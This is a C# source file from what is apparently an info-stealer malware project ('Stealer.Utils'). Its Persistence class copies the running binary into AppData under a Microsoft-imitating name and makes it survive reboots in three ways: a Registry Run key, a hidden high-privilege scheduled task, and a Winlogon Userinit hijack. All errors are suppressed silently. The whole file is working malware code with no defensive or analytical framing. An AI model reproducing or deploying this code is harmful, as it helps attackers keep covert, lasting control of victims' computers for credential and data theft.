using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace Stealer.Utils
{
    public static class Persistence
    {
        private static readonly string ExeName = "WindowsHostManager.exe";
        private static readonly string InstallDir = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "Microsoft", "HostManager");
        private static readonly string InstallPath = Path.Combine(InstallDir, ExeName);

        public static void Install()
        {
            try
            {
                string methods = Config.Persistence.ToLower();
                if (string.IsNullOrEmpty(methods) || methods == "none") return;

                if (!Directory.Exists(InstallDir))
                    Directory.CreateDirectory(InstallDir);

                string currentPath = Process.GetCurrentProcess().MainModule.FileName;
                if (!currentPath.Equals(InstallPath, StringComparison.OrdinalIgnoreCase))
                {
                    File.Copy(currentPath, InstallPath, true);
                }

                if (methods.Contains("registry")) try { RegistryRun(); } catch { }
                if (methods.Contains("scheduler")) try { TaskScheduler(); } catch { }
                if (methods.Contains("userinit")) try { Userinit(); } catch { }
            }
            catch { }
        }

        public static void Uninstall()
        {
            try
            {
                using (var key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    key?.DeleteValue("WindowsHostManager", false);
                }
            }
            catch { }

            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "schtasks",
                    Arguments = "/Delete /TN \"Microsoft\\Windows\\HostManager\\Service\" /F",
                    CreateNoWindow = true,
                    UseShellExecute = false
                })?.WaitForExit(5000);
            }
            catch { }

            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true))
                {
                    if (key != null)
                    {
                        string val = key.GetValue("Userinit", "").ToString();
                        val = val.Replace("," + InstallPath, "");
                        key.SetValue("Userinit", val);
                    }
                }
            }
            catch { }
        }

        private static void RegistryRun()
        {
            try
            {
                using (var key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    key?.SetValue("WindowsHostManager", "\"" + InstallPath + "\"");
                }
            }
            catch { }
        }

        private static void TaskScheduler()
        {
            try
            {
                string xml = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>" +
                    "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">" +
                    "<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>" +
                    "<Principals><Principal><RunLevel>HighestAvailable</RunLevel></Principal></Principals>" +
                    "<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>" +
                    "<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>" +
                    "<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>" +
                    "<Hidden>true</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle>" +
                    "<ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>" +
                    "<Actions><Exec><Command>" + InstallPath + "</Command></Exec></Actions></Task>";

                string xmlPath = Path.Combine(Path.GetTempPath(), "sht.xml");
                File.WriteAllText(xmlPath, xml);

                Process.Start(new ProcessStartInfo
                {
                    FileName = "schtasks",
                    Arguments = "/Create /TN \"Microsoft\\Windows\\HostManager\\Service\" /XML \"" + xmlPath + "\" /F",
                    CreateNoWindow = true,
                    UseShellExecute = false
                })?.WaitForExit(5000);

                File.Delete(xmlPath);
            }
            catch { }
        }

        private static void Userinit()
        {
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true))
                {
                    if (key == null) return;
                    string val = key.GetValue("Userinit", "").ToString();
                    if (!val.Contains(InstallPath))
                    {
                        val = val.TrimEnd(',') + "," + InstallPath;
                        key.SetValue("Userinit", val);
                    }
                }
            }
            catch { }
        }
    }
}
